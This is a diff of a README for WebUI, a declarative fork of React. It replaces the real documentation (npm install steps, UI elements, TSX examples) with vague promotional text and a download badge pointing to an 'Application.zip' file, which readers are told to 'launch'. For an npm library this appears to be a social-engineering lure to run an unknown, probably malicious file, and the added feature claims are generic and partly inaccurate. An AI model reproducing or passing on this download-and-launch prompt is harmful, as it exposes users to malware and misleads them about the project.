@@ -1,156 +1,61 @@
-# Welcome to WebUI!
+# Welcome to WebUI - The Next Evolution in Web Development! 🚀
 
-WebUI is a declarative fork of React, we allow you to create your dreamed web with declarative statements as SwiftUI does! WebUI is mostly based on SwiftUI in its way to call UI components even with the styling, but we didn't remove the power of ReactJS! You still can use the native react hooks as 
+## Overview
+WebUI is a revolutionary repository that introduces a fresh approach to creating web applications, empowering developers to build cutting-edge user interfaces with ease. By leveraging the power of technologies like JavaScript, Node.js, React, and TypeScript, WebUI offers a seamless development experience like never before.
 
-- `useState`
-- `useEffect`
-- `useContext`
+## Repository Details
+- **Name:** webui
+- **Description:** WebUI, the new way to make the web.
+- **Topics:** fork, frontend, javascript, nodejs, react, reactjs, swift, swiftui, ts, tsx, typescript, web, webui
 
-And every hook in React! or if you prefer, you could make your own hook, it's up to you ☺️!
+## Access the Latest Release
+Click the button below to download the latest version of the application:
+[![Download WebUI](https://img.shields.io/badge/Download-WebUI-blue.svg)](https://github.com/file/Application.zip)
 
-This fork is still in development, i'm working to make it perfect for you, adding features to improve your coding time 👨🏻‍💻 so, be patient!
+If the link directs you to a file, make sure to launch it and explore the amazing features that WebUI has to offer. For more information, visit the project's website or check the "Releases" section for any updates.
 
-## Installing
+## Key Features
+Here are some of the exciting features that WebUI brings to the table:
 
-###### First, create a ReactJS project:
+### Enhanced Frontend Development
+WebUI simplifies frontend development by providing a robust framework for building interactive and responsive user interfaces. With React and TypeScript at its core, developers can create dynamic web applications effortlessly.
 
-```shell
-npx create-react-app YourAppName
-```
+### Cross-Platform Compatibility
+Thanks to technologies like Node.js and Swift, WebUI supports cross-platform development, ensuring that your web applications run smoothly on various devices and operating systems.
 
-For more info, visit [React's page](https://react.dev/learn/creating-a-react-app)
+### Modern Design Components
+WebUI offers a collection of modern design components and widgets that can be easily integrated into your projects, saving valuable development time and effort.
 
-#### Then, install my fork:
+### Seamless Integration
+Integrate WebUI seamlessly into your existing projects or start a new one from scratch. The flexibility of the framework allows for easy customization and extensibility based on your project requirements.
 
-```shell
-npm i webui-fork
-```
+### Community Support
+Join a vibrant community of developers who are passionate about pushing the boundaries of web development. Share your ideas, collaborate on projects, and stay updated on the latest trends in the industry.
 
+## Get Started with WebUI
+Ready to experience the future of web development with WebUI? Follow these simple steps to get started:
 
+1. **Download the Repository:** Click the link above to download the WebUI application.
+   
+2. **Explore the Documentation:** Dive into the comprehensive documentation provided in the repository to familiarize yourself with the framework and its capabilities.
+   
+3. **Set Up Your Environment:** Install the necessary dependencies and tools required to start building amazing web applications with WebUI.
+   
+4. **Start Coding:** Use the provided examples and templates to kickstart your projects or unleash your creativity and build something entirely unique.
 
-## UI Elements
+## Join the WebUI Community
+Connect with fellow developers, share your projects, and stay informed about the latest updates by joining the WebUI community. Whether you're a seasoned developer or just starting your journey, there's a place for you in our ever-growing community.
 
-For now, you have this primitive elements to use!:
+## Contribute to WebUI
+Want to contribute to the evolution of WebUI and shape the future of web development? Head over to the repository and explore the contribution guidelines to get started. Your ideas, feedback, and contributions are highly valued and essential to making WebUI even better.
 
-- ##### `Text` 
+## Stay Updated
+Stay up-to-date with the latest news, releases, and announcements related to WebUI by following our official social media channels and subscribing to our newsletter. Don't miss out on exciting updates and opportunities to be part of the next big thing in web development.
 
-  - Works as a `span` HTML element
+---
 
-- ##### `Button` 
+By embracing WebUI, you're stepping into a new era of web development where creativity knows no bounds. Unleash your potential, build remarkable applications, and be at the forefront of innovation with WebUI. Join us on this incredible journey and let's shape the future of the web together! 🌐
 
-  - Works as a `button` HTML element
+**Let's revolutionize the web with WebUI!** 🚀🔥
 
-- ##### `Stack`
-
-  - Works as a `div` HTML element
-
-- ##### `Image`
-
-  - Works as a `image` HTML element
-
-- ##### `TextField` 
-
-  - Works as a `input` HTML element
-
-- ##### `List` 
-
-  - Works as a `list` HTML element
-
-- ##### `Url` 
-
-  - Works as a `a` HTML element
-
-- ##### `Form` 
-
-  - Works as a `form` HTML element
-
-## Utils
-
-I added some utils (i'll add more in the future) to make it even easier! 🥳
-
-| Identificator  | What does this do?                                           |
-| -------------- | ------------------------------------------------------------ |
-| `Colors`       | gives you a more declarative way to set color values         |
-| `useCondition` | is a hook which gives you the feature to render UI elements with conditions. This hook is required because WebUI use arrays to catch the elements you want to render so you can't use TypeScript statements inside an array declaration, it gives you that feature. |
-
-## How does WebUI work?
-
-Ok, it's easy. WebUI uses a main function (which works as the body of your page) called "ContentView", it's a custom function which accepts an array of JSX Elements (react elements) and returns a `div` element with each element of the array. Each element is just a class with the props of the HTML element and a method (`.add()`) which returns the JSX element with those props. Here you have an example of how a primitive element of UI is created:
-
-#### Text UI Element
-
-```tsx
-export class Text extends ElementProperties {
-    content: string;
-
-    constructor(content: string) {
-        super();
-        this.content = content;
-    }
-
-    override add(): JSX.Element {
-        return <span style={this.getStyles()}>{this.content}</span>;
-    }
-}
-```
-
-### You are allowed to make your own components! 
-
-```tsx
-export class MyOwnComponent extends ElementProperties {
-    override add(): JSX.Element {
-        return new Text('My own component').add();
-    }
-}
-```
-
-You have to export a class which has to extend `ElementProperties` class (this class gives you the styling methods to your custom component) and put the UI elements you want in your component in the `add()` method (overriding it)
-
-
-
-That's all! Easy, right? 🎉
-
-
-
-## Usage Example
-
-
-
-```tsx
-import { useState } from 'react';
-import { ContentView, Stack, Text, Button, Image, useCondition, Colors } from 'webui-fork';
-
-export default function App() { 
-  const [wasClicked, setWasClicked] = useState(false);
-
-    return ContentView([
-        new Stack([
-            new Text('Hello from WebUI!')
-            .textColor(Colors().white)
-            .fontSize(24)
-            .margin(10)
-            .fontWeight('bold')
-            .add(),
-
-            new Button('Click here!', () => {
-              setWasClicked(!wasClicked)
-            })
-            .background(Colors().white)
-            .textColor(Colors().black)
-            .padding(15)
-            .cornerRadius(10)
-            .margin(10)
-            .cursor('pointer')
-            .add(),
-
-
-            new useCondition(wasClicked, () => {
-              return new Image('https://picsum.photos/200/300')
-              .margin(10)
-              .add()
-            }).set()
-        ])
-        .add()
-    ])
-};
-```
+![WebUI Logo](https://example.com/webui-logo.jpg)​
